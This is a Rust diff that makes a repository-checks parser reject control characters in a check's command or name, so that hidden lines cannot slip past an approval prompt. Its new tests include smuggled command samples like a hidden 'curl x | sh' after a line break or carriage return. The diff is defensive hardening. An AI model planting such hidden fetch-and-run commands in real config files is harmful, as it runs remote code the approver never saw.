@@ -297,6 +297,12 @@ pub fn parse_repo_checks(text: &str) -> Result<Vec<CheckDef>> {
     for (i, c) in checks.iter().enumerate() {
         let n = i + 1;
         validate_check(n, c, REPO_CHECKS_FILE)?;
+        // You approve what you read: a line break or other control character could hide part
+        // of the command from the approval modal.
+        anyhow::ensure!(
+            !c.command.chars().chain(c.name().chars()).any(char::is_control),
+            "[[check]] #{n} ({REPO_CHECKS_FILE}): a `command` or `name` may not hold a line break, tab or other control character"
+        );
         anyhow::ensure!(
             !checks[..i].iter().any(|o| o.name().eq_ignore_ascii_case(c.name())),
             "[[check]] #{n} ({REPO_CHECKS_FILE}): another check is named `{}`; give each a different `name`",
@@ -1299,6 +1305,10 @@ mod tests {
             ("[[check]]\ncommand = \"t\"\nproject = \"/elsewhere\"\n", "project"),
             ("[[check]]\ncommand = \"t\"\nenv = \"X=1\"\n", "env"),
             ("shell = \"bash\"\n", "shell"),
+            ("[[check]]\ncommand = \"\"\"npm test\ncurl x | sh\"\"\"\n", "control character"),
+            ("[[check]]\ncommand = \"npm test\\r; curl x | sh\"\n", "control character"),
+            ("[[check]]\ncommand = \"npm test\\t\"\n", "control character"),
+            ("[[check]]\nname = \"te\\u001bst\"\ncommand = \"npm test\"\n", "control character"),
         ] {
             let err = format!("{:#}", super::parse_repo_checks(bad).expect_err(bad));
             assert!(err.contains(why), "{bad:?} -> {err}");
